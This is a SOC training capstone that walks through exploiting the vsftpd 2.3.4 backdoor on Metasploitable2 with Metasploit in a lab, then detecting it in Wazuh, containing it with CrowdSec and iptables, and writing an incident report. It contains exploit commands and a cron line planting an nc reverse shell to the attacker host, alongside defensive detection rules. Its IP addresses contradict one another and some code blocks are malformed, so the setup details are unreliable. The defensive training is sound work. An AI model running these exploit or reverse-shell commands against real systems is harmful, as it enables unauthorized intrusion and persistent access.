#  08 — Capstone Project: Full Alert-to-Response Cycle

> **Tools:** Metasploit · Wazuh · CrowdSec · Google Docs  
> **Goal:** Simulate a real attack, detect it in Wazuh, triage, respond, block, and write a full report.
**This capstone integrates all modules into a realistic end-to-end SOC exercise. You will simulate a real attack, detect it using Wazuh, triage and respond to it, preserve evidence, and produce professional documentation.**


**Estimated Time:** 6–8 hours  
**Difficulty:** Intermediate  
**Tools Required:** Metasploit, Wazuh, CrowdSec, Velociraptor, Google Docs, TheHive
---

##  Lab Setup

```
-------------------------------------------------------------------
│                    LAB NETWORK: 10.0.0.20/24                  │
│------------------------------------------------------------------│
│                                                                  |
│  │   Kali Linux     │    │ Metasploitable2  │                    │
│  │  (Attacker)      │─── │   (Target)       │                    │
│  │ 10.0.0.20        │    │ 192.168.56.102   │                    │
│                                   |                               │
│           │                       │                              │
│           │                       │ (Wazuh agent installed)      │
│           │                       |                              │
│           │                       |                              │
│           --------------  │  Wazuh Manager   │                    │
│                           │ (SIEM/Detector)  │                    │
│                           │ 10.0.0.20        │                    │
│                                                                   │
--------------------------------------------------------------------
```

### Network Architecture


### VM Setup Requirements

```bash
# VMs needed (VirtualBox or VMware):
# 1. Wazuh Server OVA         - https://documentation.wazuh.com/
# 2. Metasploitable2 ISO      - https://sourceforge.net/projects/metasploitable/
# 3. Kali Linux ISO           - https://kali.org/get-kali/

# Configure all VMs on Host-Only Network: 10.0.0.20.0/24
# Kali:           10.0.20.100
# Metasploitable: 192.168.56.102
# Wazuh:          10.0.26.10

# Install Wazuh agent on Metasploitable2
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | sudo apt-key add -
echo "deb https://packages.wazuh.com/4.x/apt/ stable main" | sudo tee /etc/apt/sources.list.d/wazuh.list
sudo apt update && sudo apt install wazuh-agent
sudo sed -i "s/MANAGER_IP/192.168.56.10/g" /var/ossec/etc/ossec.conf
sudo service wazuh-agent start
```
### Step 1: Install VirtualBox
```bash
# Ubuntu/Debian:
sudo apt-get update
sudo apt-get install virtualbox virtualbox-ext-pack -y

# Verify installation:
VBoxManage --version
# Expected: 7.x.x
```

### Step 2: Download VMs
```
1. Kali Linux OVA:
   URL: https://www.kali.org/get-kali/#kali-virtual-machines
   File: kali-linux-2024.x-virtualbox-amd64.ova
   
2. Metasploitable2 ZIP:
   URL: https://sourceforge.net/projects/metasploitable/
   File: metasploitable-linux-2.0.0.zip
   
3. Wazuh OVA:
   URL: https://documentation.wazuh.com/current/deployment-options/virtual-machine/virtual-machine.html
   File: wazuh-4.x.x.ova
```

### Step 3: Configure VirtualBox Host-Only Network
```
VirtualBox → File → Host Network Manager

Create Host-Only Network:
  Name:      vboxnet0
  IP:        10.0.0.20
  Netmask:   255.255.255.0
  DHCP:      Disabled (we assign IPs manually)
```

### Step 4: Import and Configure VMs

**Kali Linux:**
```
1. File → Import Appliance → Select kali OVA
2. Settings → Network:
   - Adapter 1: NAT (for internet access)
   - Adapter 2: Host-Only (vboxnet0)
3. Start VM
4. Login: kali / kali
5. Set static IP:
   sudo nano /etc/network/interfaces
   # Add:
   auto eth1
   iface eth1 inet static
       address 12.0.0.2
       netmask 255.255.255.0
   sudo systemctl restart networking
   ip addr show eth1   # Verify IP
```

**Metasploitable2:**
```
1. File → Import Appliance → Select Metasploitable OVA
   (or extract ZIP and attach .vmdk as hard disk)
2. Settings → Network:
   - Adapter 1: Host-Only (vboxnet0)
3. Start VM
4. Login: msfadmin / msfadmin
5. Verify IP:
   ifconfig eth0
   # Should show 10.0.0.20
   # If not, set manually:
   sudo ifconfig eth0 10.0.0.20 netmask 255.255.255.0
```

**Wazuh:**
```
1. File → Import Appliance → Select Wazuh OVA
2. Settings → Network:
   - Adapter 1: NAT
   - Adapter 2: Host-Only (vboxnet0)
3. Start VM
4. Login: wazuh-user / wazuh
5. Set static IP on Host-Only interface:
   sudo nano /etc/netplan/01-wazuh.yaml
   # Add:
     eth1:
       addresses: [10.0.0.22/24]
   sudo netplan apply
```

### Step 5: Install Wazuh Agent on Metasploitable2
```bash
# On Metasploitable2:
# Note: Metasploitable2 runs Ubuntu 8.04 (old, but agent works)

# Download Wazuh agent DEB package (from Wazuh server or internet):
wget -O /tmp/wazuh-agent.deb https://packages.wazuh.com/4.x/apt/pool/main/w/wazuh-agent/wazuh-agent_4.9.0-1_amd64.deb

# Install:
sudo dpkg -i /tmp/wazuh-agent.deb

# Configure to point to Wazuh manager:
sudo nano /var/ossec/etc/ossec.conf

# Find <server> block and set:
<address>192.168.56.103</address>

# Start agent:
sudo /var/ossec/bin/ossec-control start

# Register agent on Wazuh Manager (run on manager):
# Go to Wazuh UI → Agents → Add agent → Copy registration command
# Run on Metasploitable2 and restart agent
```

### Step 6: Verify Connectivity
```bash
# From Kali:
ping 10.0.0.22    # Should reach Metasploitable2
ping 10.0.0.20    # Should reach Wazuh

# From Wazuh manager:
# Check Wazuh UI → Agents → Should show Metasploitable2 as "Active"

# Test Metasploitable2 services:
nmap -sV 192.168.56.102
# Should show: FTP(21), SSH(22), Telnet(23), HTTP(80), vsftpd(2.3.4), etc.
```

---

##  Phase 1: Attack Simulation (Metasploit)

### Step 1.1: Launch Metasploit Framework
```bash
# On Kali Linux:
sudo msfconsole
### Step 2: Launch Metasploit

```bash
# Start Metasploit Framework
msfconsole

                                                  ___
                                              ,-""   `.
                                            ,'  _   e )`-.
                                           /  ,' `-._<.===-'
                                          /  /
                                         /  ;
        _________________________________/  /
       (_____________(  )_______________(  /
       (_____________()_____________(_)  (
                                        `\  \
                                          `\  \
                                           `\  >--,
                                             )=`  (
                                       ,==`-'     )
                                      ( `\ ,----"
                                       \ / /
                                        V /
     msf6 >
```

# Wait for MSF banner to load
# Expected: Metasploit Framework console v6.x.x
```bash
# On Kali Linux — Discover target
nmap -sV -sC -O 10.0.0.20-oN recon_metasploitable.txt
msf6 > ping -c 3 10.0.0.20
```

### Step 1.2: Reconnaissance — Port Scan
```bash
# Expected output (partial):
# PORT    STATE SERVICE VERSION
# 21/tcp  open  ftp     vsftpd 2.3.4        ← VULNERABLE!
# 22/tcp  open  ssh     OpenSSH 4.7p1
# 23/tcp  open  telnet  Linux telnetd
# 80/tcp  open  http    Apache httpd 2.2.8
# 3306/tcp open mysql   MySQL 5.0.51a-3ubuntu5

# Also run nmap for service detection:
msf6 > exit
nmap -sV -sC -O 192.168.56.102 -oA /tmp/recon_metasploitable

echo "[RECON] vsftpd 2.3.4 identified — CVE-2011-2523 — Backdoor"
```

### Step 1.3: Identify vsftpd 2.3.4 Backdoor (CVE-2011-2523)
```
VULNERABILITY DETAILS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
CVE:          CVE-2011-2523
CVSS Score:   10.0 (CRITICAL)
Description:  vsftpd 2.3.4 was backdoored. When a username
              containing ":)" (smiley face) is submitted during
              FTP authentication, a backdoor shell is opened on
              port 6200.
Impact:       UNAUTHENTICATED remote root shell
Vector:       Network / No auth required / No user interaction
```

### Step 1.4: Exploit vsftpd 2.3.4 Backdoor
```bash
# Launch msfconsole:
sudo msfconsole

# Select the exploit:
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor

# View module options:
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options

# Required Options:
# RHOSTS: Target IP
# RPORT:  21 (FTP port, default)

# Configure the exploit:
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.0.0.20
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RPORT 21

# Set payload (reverse shell):
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set PAYLOAD cmd/unix/interact

# Launch the exploit:
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

# Expected output:
# [*] 10.0.0.20 - Banner: 220 (vsFTPd 2.3.4)
# [*] 10.0.0.20 - USER: 331 Please specify the password.
# [+] 10.0.0.20 - Backdoor service has been spawned, handling...
# [+] 10.0.0.20 - UID: uid=0(root) gid=0(root)
# [*] Found shell.
# [*] Command shell session 1 opened

# You now have a ROOT shell on the target!
```

### Step 1.5: Post-Exploitation Activities
```bash
# You are now inside a shell on Metasploitable2:

# Check your privileges:
id
# uid=0(root) gid=0(root) groups=0(root)

# Check system info:
uname -a
hostname
cat /etc/passwd

# Simulate data discovery:
ls /home
ls /var/www
find / -name "*.conf" 2>/dev/null | head -20

# Simulate persistence (for realism — won't persist after VM restart):
echo "0 * * * * root nc -e /bin/bash 192.168.56.101 4444" >> /etc/crontab

# Simulate lateral movement attempt:
cat /etc/hosts
arp -a

# Exit the shell:
exit
# Back in msfconsole:
msf6 > exit
```

---

##  Detection & Alert Analysis (Wazuh)

### Step 1: Check Wazuh for Alerts
```bash
# Access Wazuh Web UI:
https://10.0.0.20

# Navigate to: Security Events
# Filter by agent: Metasploitable2

# Look for alerts related to:
# - FTP activity (rule groups: ftpd)
# - New network connections
# - Process execution (bash spawned from vsftpd)
# - File modifications

# Search in Wazuh Discover:
agent.name: "metasploitable2" AND rule.level: [9 TO 15]
```

### Step 2: Configure Additional Detection Rules
```bash
# On Wazuh Manager, add rules:
sudo nano /var/ossec/etc/rules/local_rules.xml

# Add these rules:
<group name="vsftpd_attack,">

  <!-- Rule: Detect vsftpd backdoor activation -->
  <rule id="100010" level="15">
    <if_sid>5700</if_sid>
    <match>vsftpd</match>
    <description>Possible vsftpd 2.3.4 backdoor activation</description>
    <mitre>
      <id>T1190</id>
    </mitre>
  </rule>
  
  <!-- Rule: Root shell spawned -->
  <rule id="100011" level="15">
    <program_name>vsftpd</program_name>
    <match>bash.*6200</match>
    <description>Root shell spawned from vsftpd — CRITICAL BACKDOOR</description>
    <mitre>
      <id>T1190</id>
    </mitre>
  </rule>
  
  <!-- Rule: Port 6200 connection (vsftpd backdoor port) -->
  <rule id="100012" level="12">
    <if_sid>1002</if_sid>
    <match>dport=6200</match>
    <description>Connection to vsftpd backdoor port 6200 detected</description>
  </rule>

</group>

# Restart Wazuh manager:
sudo systemctl restart wazuh-manager
```

### Step 3: Verify Alert Generation
```bash
# Re-run the exploit from Kali (so Wazuh can log it)
# Check Wazuh UI for new alerts

# On Wazuh manager, check raw alerts:
sudo tail -f /var/ossec/logs/alerts/alerts.log | grep -i "vsftpd\|ftp\|backdoor"

# Check Wazuh alerts.json for structured data:
sudo tail -f /var/ossec/logs/alerts/alerts.json | python3 -m json.tool
```

### Step 4: Document the Detection Alert

```
WAZUH DETECTION ALERT DOCUMENTATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

| Field             | Value                                        |
|-------------------|----------------------------------------------|
| Alert ID          | WZ-20001                                     |
| Timestamp (UTC)   | 2026-03-24 11:00:00                          |
| Rule ID           | 100012 (custom) + 5712 (FTP login)           |
| Rule Level        | 12 (High)                                    |
| Alert Title       | FTP Exploit Attempt - vsftpd backdoor        |
| Source IP         | 10.0.0.201 (Kali — Attacker)             |
| Destination IP    | 192.168.56.102 (Metasploitable2)             |
| Destination Port  | 21 (FTP) → 6200 (backdoor)                  |
| Agent Name        | metasploitable2                              |
| MITRE Tactic      | TA0001 - Initial Access                      |
| MITRE Technique   | T1190 - Exploit Public-Facing Application    |
| CVE               | CVE-2011-2523                                |
| CVSS Score        | 10.0                                         |
| Priority          | CRITICAL                                     |
| Status            | ACTIVE                                       |
```

---

## PHASE 3: Triage & Incident Response

### Step 3.1: Triage the Alert

**Triage Decision:**
```
Alert: FTP Exploit - vsftpd 2.3.4 Backdoor
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. FALSE POSITIVE CHECK:
   - Is there an authorized pentest in progress? Check change management.
   - Is 192.168.56.101 (Kali) an authorized scanner? 
   - For this lab: NO → This is a real attack simulation.
   → NOT a false positive. Proceed.

2. SEVERITY ASSESSMENT:
   - CVE-2011-2523 CVSS: 10.0 = CRITICAL
   - Attacker obtained ROOT shell = full system compromise
   - Metasploitable2 = test system (low business impact in lab)
   - In real environment: CRITICAL system would be P1

3. PRIORITY: CRITICAL
4. ACTION: Open incident, isolate, respond
```

### Step 3.2: Open TheHive Case
```
Create New Case in TheHive:

Title:     "[CRITICAL] vsftpd 2.3.4 Backdoor Exploitation — Metasploitable2"
Severity:  Critical (4)
Date:      2026-03-24 11:00 UTC
TLP:       AMBER
PAP:       AMBER
Tags:      ["exploit", "ftp", "T1190", "CVE-2011-2523", "critical", "rootshell"]

Description:
━━━━━━━━━━━━
Critical incident: Wazuh detected exploitation of CVE-2011-2523 (vsftpd 2.3.4
backdoor) on host Metasploitable2 (192.168.56.102). Attacker IP 192.168.56.101
(Kali Linux) exploited the FTP backdoor, spawning a root shell via port 6200.

Full system compromise confirmed. Immediate containment required.

IOCs:
- Attacker IP: 10.0.0.20
- Target IP: 192.168.56.102:21 (vsftpd 2.3.4)
- Backdoor Port: 6200
- CVE: CVE-2011-2523
- CVSS: 10.0

Timeline:
- 11:00 UTC: Wazuh detection
- 11:05 UTC: SOC analyst notified
- 11:10 UTC: Incident ticket opened
```

### Step 3.3: Containment
```bash
# STEP 1: Block attacker IP with CrowdSec

# Install CrowdSec on Metasploitable2 (or Wazuh manager):
curl -s https://packagecloud.io/install/repositories/crowdsec/crowdsec/script.deb.sh | sudo bash
sudo apt-get install crowdsec crowdsec-firewall-bouncer-iptables -y

# Configure CrowdSec to monitor FTP logs:
sudo nano /etc/crowdsec/acquis.yaml

# Add:
filenames:
  - /var/log/vsftpd.log
labels:
  type: vsftpd
---

# Start CrowdSec:
sudo systemctl start crowdsec
sudo systemctl enable crowdsec

# Manually ban the attacker IP:
sudo cscli decisions add --ip 10.0.0.20 --reason "vsftpd backdoor exploitation" --duration 24h

# Verify ban:
sudo cscli decisions list

# Expected output:
# ID  | Source  | Scope:Value            | Reason                | Action | Country | ...
# 1   | manual  | Ip:10.0.0.20    | vsftpd backdoor...    | ban    | ...

# STEP 2: Firewall block with iptables (immediate)
sudo iptables -I INPUT -s 10.0.0.20 -j DROP
sudo iptables -I OUTPUT -d 10.0.0.20 -j DROP

# Verify block with ping test from Metasploitable2:
ping -c 3 192.168.56.101
# Expected: 100% packet loss (blocked)
```

### Step 3.4: Verify Containment
```bash
# From Kali Linux — try to re-exploit:
sudo msfconsole -q
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > set RHOSTS 192.168.56.102
msf6 > exploit

# Expected: 
# [*] 192.168.56.102:21 - Exploit failed: connection timeout
# (Or FTP connection refused if CrowdSec bouncer is active)
# ✅ CONTAINMENT CONFIRMED

# Also verify FTP is inaccessible:
ftp 192.168.56.102
# Expected: Connection timed out / Connection refused
```

### Step 3.5: Evidence Collection
```bash
# IMMEDIATELY after containment — collect volatile evidence:

# ON Metasploitable2 (via Wazuh active response or direct access):

# 1. Capture running processes:
ps aux > /tmp/processes_$(date +%Y%m%d_%H%M%S).txt
netstat -antp > /tmp/netstat_$(date +%Y%m%d_%H%M%S).txt

# 2. Capture auth logs (vsftpd activity):
cat /var/log/auth.log | grep -i "vsftpd\|ftp\|2026-03-24" > /tmp/auth_log_evidence.txt
cat /var/log/vsftpd.log > /tmp/vsftpd_log_evidence.txt

# 3. Hash all evidence:
sha256sum /tmp/processes_*.txt > /tmp/evidence_hashes.txt
sha256sum /tmp/netstat_*.txt >> /tmp/evidence_hashes.txt
sha256sum /tmp/auth_log_evidence.txt >> /tmp/evidence_hashes.txt
sha256sum /tmp/vsftpd_log_evidence.txt >> /tmp/evidence_hashes.txt

cat /tmp/evidence_hashes.txt

# 4. Transfer evidence to analyst workstation:
scp /tmp/*.txt analyst@192.168.56.103:/evidence/INC-2026-CAPSTONE/
```

---

## PHASE 4: Eradication

### Step 4.1: Remove Backdoor Service
```bash
# On Metasploitable2:

# Check vsftpd version (confirm vulnerable):
vsftpd --version 2>&1
cat /etc/vsftpd.conf | grep version

# Disable vsftpd service:
sudo service vsftpd stop
sudo update-rc.d vsftpd disable

# Verify vsftpd is stopped:
sudo service vsftpd status

# In a real environment, you would:
# 1. Remove the backdoored version
# 2. Install patched version from official repo
# 3. Apply patch to configuration

# Remove the cron backdoor we added in Phase 1:
sudo crontab -e
# Remove the nc reverse shell line we added
```

### Step 4.2: Patch Verification
```bash
# Verify port 6200 is no longer listening:
netstat -tlnp | grep 6200
# Expected: no output (port not open)

# Verify FTP service is down:
netstat -tlnp | grep :21
# Expected: no output (vsftpd stopped)

# Run an nmap scan to verify:
# From Kali:
nmap -p 21,6200 192.168.56.102
# Expected:
# 21/tcp   closed ftp
# 6200/tcp closed unknown
```

---

## PHASE 5: Recovery

### Step 5.1: Recovery Procedures
```bash
# In a real environment, recovery would involve:
# 1. Restore from clean backup (pre-compromise snapshot)
# 2. Install patched vsftpd

# For lab: Restore from VirtualBox snapshot
# VirtualBox → Metasploitable2 → Snapshots → Restore "Clean State"

# Or: Update vsftpd to non-backdoored version:
sudo apt-get remove vsftpd
sudo apt-get install vsftpd   # Gets clean version from Ubuntu repos

# Verify clean version:
vsftpd --version
# Should be 3.x.x (not 2.3.4)
```

### Step 5.2: Recovery Validation
```bash
# Validation checklist:
# From Kali, verify the backdoor no longer exists:

nmap -p 6200 192.168.56.102
# Expected: 6200/tcp closed

sudo msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.56.102; run; exit"
# Expected: Exploit failed: host unreachable OR backdoor port not open

# Check Wazuh: no new critical alerts since containment
```

---

## PHASE 6: Documentation & Reporting

### Step 6.1: Write the Final Incident Report

**Save as Google Doc or PDF (see template below):**

```
═══════════════════════════════════════════════════════════════════
        INCIDENT RESPONSE REPORT — INC-2026-CAPSTONE-001
═══════════════════════════════════════════════════════════════════

CLASSIFICATION: CONFIDENTIAL — INTERNAL DISTRIBUTION ONLY

Incident ID:        INC-2026-CAPSTONE-001
Incident Title:     Critical — vsftpd 2.3.4 Backdoor Exploitation
Severity:           Critical
Status:             RESOLVED
Report Date:        2026-03-24
Prepared By:        [SOC Analyst Name]
Reviewed By:        [SOC Lead Name]

═══════════════════════════════════════════════════════════════════
1. EXECUTIVE SUMMARY
═══════════════════════════════════════════════════════════════════

On March 24, 2026, Wazuh SIEM detected unauthorized exploitation of a
critical backdoor vulnerability (CVE-2011-2523) in vsftpd 2.3.4 on the
host Metasploitable2 (192.168.56.102). The attacker, operating from IP
192.168.56.101, exploited the FTP backdoor to obtain an unauthenticated
root shell on the target system.

The Security Operations Center detected the incident within 5 minutes of
the initial compromise. Immediate containment was performed by blocking
the attacker IP using CrowdSec and iptables. The compromised service was
disabled, and the system was remediated by removing the backdoored vsftpd
version.

The incident has been fully resolved. No data exfiltration was confirmed.
No lateral movement was detected. The vulnerable service has been
permanently disabled pending upgrade to a patched version.

═══════════════════════════════════════════════════════════════════
2. INCIDENT TIMELINE
═══════════════════════════════════════════════════════════════════

| Date/Time (UTC)       | Event                                        |
|-----------------------|----------------------------------------------|
| 2026-03-24 10:55 UTC  | Attacker performs port scan (nmap) on target |
| 2026-03-24 11:00 UTC  | Attacker exploits vsftpd 2.3.4 backdoor      |
| 2026-03-24 11:00 UTC  | Root shell obtained on Metasploitable2       |
| 2026-03-24 11:02 UTC  | Attacker runs post-exploitation commands     |
| 2026-03-24 11:03 UTC  | Wazuh alert generated (Rule Level 12)        |
| 2026-03-24 11:05 UTC  | SOC analyst begins triage                    |
| 2026-03-24 11:08 UTC  | Alert confirmed as true positive             |
| 2026-03-24 11:10 UTC  | Incident ticket opened in TheHive            |
| 2026-03-24 11:15 UTC  | Attacker IP blocked via CrowdSec + iptables  |
| 2026-03-24 11:17 UTC  | Containment verified (re-exploit failed)     |
| 2026-03-24 11:20 UTC  | Evidence collected and hashed                |
| 2026-03-24 11:30 UTC  | vsftpd service disabled (eradication)        |
| 2026-03-24 11:45 UTC  | System restored from clean snapshot          |
| 2026-03-24 12:00 UTC  | Recovery validation completed                |
| 2026-03-24 12:15 UTC  | Incident declared resolved                   |

═══════════════════════════════════════════════════════════════════
3. TECHNICAL DETAILS
═══════════════════════════════════════════════════════════════════

ATTACK VECTOR: Remote — Network (FTP port 21)
VULNERABILITY: CVE-2011-2523 (vsftpd 2.3.4 Backdoor)
CVSS v3 Score: 10.0 (CRITICAL)
CVSS Vector:   AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

MITRE ATT&CK Mapping:
  Tactic:    TA0001 - Initial Access
  Technique: T1190 - Exploit Public-Facing Application
  Sub-tech:  T1059.004 - Unix Shell (post-exploitation)

INDICATORS OF COMPROMISE (IOCs):
  Source IP:          10.0.0.20
  Target IP:          192.168.56.102
  Exploited Port:     21/tcp (FTP)
  Backdoor Port:      6200/tcp
  Malicious Process:  /bin/bash (spawned by vsftpd)
  Attacker Tool:      Metasploit Framework
  Module Used:        exploit/unix/ftp/vsftpd_234_backdoor

AFFECTED SYSTEMS:
  Hostname:           metasploitable2
  IP:                 192.168.56.102
  OS:                 Ubuntu 8.04 LTS
  Service Affected:   vsftpd 2.3.4 (port 21)

EVIDENCE COLLECTED:
  EVD-001:  processes_20260324_110800.txt (SHA256: <hash>)
  EVD-002:  netstat_20260324_110800.txt   (SHA256: <hash>)
  EVD-003:  auth_log_evidence.txt         (SHA256: <hash>)
  EVD-004:  vsftpd_log_evidence.txt       (SHA256: <hash>)

═══════════════════════════════════════════════════════════════════
4. IMPACT ANALYSIS
═══════════════════════════════════════════════════════════════════

IMPACT SUMMARY:
  Confidentiality:  HIGH   — Root access to all system data
  Integrity:        HIGH   — Attacker could modify any file
  Availability:     HIGH   — Complete system control

BUSINESS IMPACT (Lab Context):
  - Test/lab environment — production impact: None
  - Real-world equivalent: Full server compromise would require
    complete rebuild and security review of all adjacent systems

DATA AT RISK:
  - All files on the compromised system
  - Potential for credential harvesting (/etc/shadow)
  - Network pivot opportunity to internal systems

═══════════════════════════════════════════════════════════════════
5. RESPONSE ACTIONS
═══════════════════════════════════════════════════════════════════

IMMEDIATE CONTAINMENT:
✓ Attacker IP 10.0.0.20 blocked via CrowdSec
✓ iptables rules applied to block all traffic from attacker
✓ vsftpd service stopped

ERADICATION:
✓ vsftpd 2.3.4 (backdoored version) removed
✓ Cron backdoor removed
✓ System restored from clean snapshot

RECOVERY:
✓ System operational on clean snapshot
✓ New vsftpd (patched) configured and tested
✓ Monitoring enhanced (additional Wazuh rules deployed)

═══════════════════════════════════════════════════════════════════
6. RECOMMENDATIONS
═══════════════════════════════════════════════════════════════════

IMMEDIATE (< 1 week):
  1. Patch vsftpd to version 3.x.x across all systems
  2. Audit all FTP services in production environment
  3. Remove or disable vsftpd where not required
  4. Add CVE-2011-2523 to vulnerability scanner signature list

SHORT-TERM (< 1 month):
  5. Implement network segmentation (FTP servers in DMZ)
  6. Deploy vulnerability scanner (OpenVAS/Nessus) for regular scans
  7. Implement CrowdSec on all internet-facing systems
  8. Create automated response playbook for FTP exploit alerts

LONG-TERM:
  9. Replace FTP with SFTP or FTPS across the organization
  10. Implement continuous vulnerability management program
  11. Schedule quarterly purple team exercises

═══════════════════════════════════════════════════════════════════
7. LESSONS LEARNED
═══════════════════════════════════════════════════════════════════

WHAT WENT WELL:
  ✓ Detection was fast (3 minutes from exploit to Wazuh alert)
  ✓ Containment was effective (attacker blocked immediately)
  ✓ Evidence preserved before eradication
  ✓ Communication was clear and timely

WHAT NEEDS IMPROVEMENT:
  ✗ Outdated vulnerable software should have been patched earlier
  ✗ No alert existed specifically for vsftpd 2.3.4 (custom rule needed)
  ✗ Automated response (SOAR playbook) would speed containment

ROOT CAUSE:
  Unpatched legacy software (vsftpd 2.3.4 from 2011) was running on
  a test system. The backdoor is well-known and easily exploitable.
  Lack of regular vulnerability scanning allowed it to persist.

ACTION ITEMS:
  | # | Action                               | Owner      | Due Date   |
  |---|--------------------------------------|------------|------------|
  | 1 | Patch vsftpd on all systems          | SysAdmin   | 2026-03-31 |
  | 2 | Deploy OpenVAS for vuln scanning      | SecOps     | 2026-04-07 |
  | 3 | Write SOAR playbook for FTP exploits  | SOC Lead   | 2026-04-14 |
  | 4 | Implement CrowdSec on all DMZ hosts   | NetAdmin   | 2026-04-07 |
  | 5 | Update SIEM rules for vsftpd attacks  | SOC Analyst| 2026-03-28 |
```

### Step 6.2: Stakeholder Briefing (Non-Technical)

```
STAKEHOLDER BRIEFING — INC-2026-CAPSTONE-001
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Date: March 24, 2026
To:   IT Management / CISO
From: SOC Analyst Team

WHAT HAPPENED:
An attacker exploited a known security weakness in one of our file 
transfer servers (similar to leaving a hidden back door unlocked). 
They briefly gained full control of the server.

WHAT WE DID:
Our monitoring system detected the attack within 3 minutes. We 
immediately blocked the attacker and secured the server. No sensitive 
data was confirmed stolen.

CURRENT STATUS: 
The server is clean and back to normal operation. The security 
weakness has been fixed.

NEXT STEPS:
We are scanning all similar systems and applying security updates.
A full security audit is scheduled for next week.

No further action required from management at this time.
```

---

## PHASE 7: Final Verification & Quality Check

### Complete Capstone Checklist

```
ENVIRONMENT SETUP:
[ ] VirtualBox configured with Host-Only network
[ ] Kali Linux running on 192.168.56.101
[ ] Metasploitable2 running on 192.168.56.102
[ ] Wazuh running on 192.168.56.103
[ ] Wazuh agent registered on Metasploitable2

PHASE 1 — ATTACK:
[ ] Reconnaissance scan performed (nmap)
[ ] vsftpd 2.3.4 identified
[ ] Metasploit exploit configured correctly
[ ] Root shell obtained
[ ] Post-exploitation commands executed

PHASE 2 — DETECTION:
[ ] Wazuh alert generated
[ ] Alert documented in triage log
[ ] Alert classified with MITRE ATT&CK (T1190)
[ ] Priority assessed as CRITICAL

PHASE 3 — INCIDENT RESPONSE:
[ ] TheHive case created with full IOC list
[ ] CrowdSec IP ban applied
[ ] iptables rules applied
[ ] Containment verified (re-exploit failed)
[ ] Evidence collected and hashed

PHASE 4 — ERADICATION:
[ ] vsftpd service disabled/removed
[ ] Cron backdoor removed
[ ] Backdoor port (6200) verified closed

PHASE 5 — RECOVERY:
[ ] System restored to clean state
[ ] Services verified operational
[ ] Enhanced monitoring deployed

PHASE 6 — DOCUMENTATION:
[ ] Full IR report written (200+ words)
[ ] Timeline table completed
[ ] Impact analysis written
[ ] Recommendations listed
[ ] Action items assigned
[ ] Stakeholder briefing written (100 words)

SCREENSHOTS:
[ ] 01 — nmap reconnaissance output
[ ] 02 — Metasploit module configuration
[ ] 03 — Root shell obtained
[ ] 04 — id showing uid=0(root)
[ ] 05 — Wazuh alert view
[ ] 06 — Alert detail with MITRE mapping
[ ] 07 — Custom Wazuh rule
[ ] 08 — TheHive case with IOCs
[ ] 09 — CrowdSec ban decision
[ ] 10 — iptables block rule
[ ] 11 — Ping showing blocked (100% loss)
[ ] 12 — Re-exploit attempt failing
[ ] 13 — SHA256 hash evidence
```

---

## All Commands Quick Reference

```bash
# ══════════════════════════════════════════════
# RECONNAISSANCE
# ══════════════════════════════════════════════
nmap -sV -sC -O 192.168.56.102 -oA /tmp/recon

# ══════════════════════════════════════════════
# METASPLOIT EXPLOITATION
# ══════════════════════════════════════════════
sudo msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.102
set PAYLOAD cmd/unix/interact
exploit

# ══════════════════════════════════════════════
# WAZUH — CHECK ALERTS
# ══════════════════════════════════════════════
sudo tail -f /var/ossec/logs/alerts/alerts.log
sudo grep -i "ftp\|vsftpd" /var/ossec/logs/alerts/alerts.json

# ══════════════════════════════════════════════
# CROWDSEC — BAN ATTACKER
# ══════════════════════════════════════════════
sudo cscli decisions add --ip 192.168.56.101 --reason "vsftpd exploit" --duration 24h
sudo cscli decisions list

# ══════════════════════════════════════════════
# IPTABLES — BLOCK ATTACKER
# ══════════════════════════════════════════════
sudo iptables -I INPUT -s 10.0.0.20 -j DROP
sudo iptables -I OUTPUT -d 10.0.0.20 -j DROP
sudo iptables -L -n -v | grep 10.0.0.20

# ══════════════════════════════════════════════
# EVIDENCE COLLECTION
# ══════════════════════════════════════════════
ps aux > /tmp/processes_$(date +%Y%m%d_%H%M%S).txt
netstat -antp > /tmp/netstat_$(date +%Y%m%d_%H%M%S).txt
sha256sum /tmp/*.txt > /tmp/evidence_hashes.txt

# ══════════════════════════════════════════════
# ERADICATION
# ══════════════════════════════════════════════
sudo service vsftpd stop
sudo update-rc.d vsftpd disable
netstat -tlnp | grep :6200   # Verify closed

# ══════════════════════════════════════════════
# VERIFICATION
# ══════════════════════════════════════════════
ping -c 3 192.168.56.101     # Should fail (blocked)
nmap -p 21,6200 192.168.56.102  # Both should be closed
```

---

## References Used in This Capstone

| Reference | URL |
|-----------|-----|
| CVE-2011-2523 (vsftpd Backdoor) | https://nvd.nist.gov/vuln/detail/CVE-2011-2523 |
| Metasploit Unleashed | https://www.offensive-security.com/metasploit-unleashed/ |
| Wazuh Documentation | https://documentation.wazuh.com |
| CrowdSec Documentation | https://docs.crowdsec.net |
| MITRE T1190 | https://attack.mitre.org/techniques/T1190/ |
| NIST SP 800-61r2 | https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf |
| SANS IR Template | https://www.sans.org/white-papers/33901/ |
| Velociraptor Docs | https://docs.velociraptor.app |

---

*Capstone Complete! You have simulated a real attack, detected it, responded professionally, and documented everything to industry standards.*


